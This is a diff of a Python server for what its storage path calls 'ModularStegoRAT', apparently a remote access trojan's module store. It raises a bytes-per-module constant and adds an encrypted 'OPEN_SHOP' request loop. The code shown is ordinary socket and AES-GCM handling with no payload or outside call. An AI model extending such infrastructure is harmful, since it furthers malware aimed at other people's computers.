@@ -15,7 +15,7 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 DATABASE_NAME = "ModuleDatabase.db"
 INCOMING_CONNECTION_HOST = "127.0.0.1"
 INCOMING_CONNECTION_PORT = 12345
-NUM_BYTES_PER_MODULE = 0 #TODO : Consider 3 instead - 2 provides 65536 which may not be highly scalable
+NUM_BYTES_PER_MODULE = 2 #TODO : Consider 3 instead - 2 provides 65536 which may not be highly scalable
 MODULE_STORAGE = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Database Module Storage"
 
 def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
@@ -242,6 +242,23 @@ def HandleClient(clientSocket : socket.socket):
             
         clientSocket.shutdown(socket.SHUT_RDWR)
         clientSocket.close()      
+
+    elif(requestType == "OPEN_SHOP"):
+        #Shop management
+        shopping = True
+        seedNonceIncrement = 1
+        
+        while(shopping):
+            clientRequest = aes.decrypt(IncrementNonce(seedNonce, seedNonceIncrement), clientSocket.recv(1024).rstrip(b"\0"), None)
+            clientRequest = json.loads(clientRequest.decode())
+            seedNonceIncrement += 1
+            
+            print(clientRequest)
+            
+            if(clientRequest["Type"] == "CLOSE_SHOP"):
+                shopping = False
+                clientSocket.shutdown(socket.SHUT_RDWR)
+                clientSocket.close()
 
 #Accept users
 incomingConnectionSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
